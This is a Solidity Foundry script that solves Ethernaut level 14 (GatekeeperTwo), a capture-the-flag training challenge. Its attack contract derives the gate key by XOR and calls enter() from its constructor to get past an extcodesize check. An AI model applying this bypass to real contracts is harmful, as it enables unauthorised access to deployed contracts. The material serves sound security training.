// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../../src/level-14/EthernautGatekeeperTwo.sol";

contract GatekeeperTwoSolution is Script {
    GatekeeperTwoAttack attacker;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attacker = new GatekeeperTwoAttack();
        // require(success, "Delegate call failed");
        // attacker.attack();
        vm.stopBroadcast();
    }
}

contract GatekeeperTwoAttack {
    GatekeeperTwo gateKeeperTwo =
        GatekeeperTwo(0x5dD1D737275c0A892B862B3B34CAD09E4A42Eac0);

    /**
     * @notice for Bitwise XOR operation, suppose a ^ b = c. Then we can do c ^ a = b.
     * @notice constructor exist before smart contract created. So, extcodesize(caller()) for check only EOA allowed were bypassed.
     */
    constructor() {
        uint64 gateKey = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        ) ^ type(uint64).max;
        gateKeeperTwo.enter(bytes8(gateKey));
    }
}
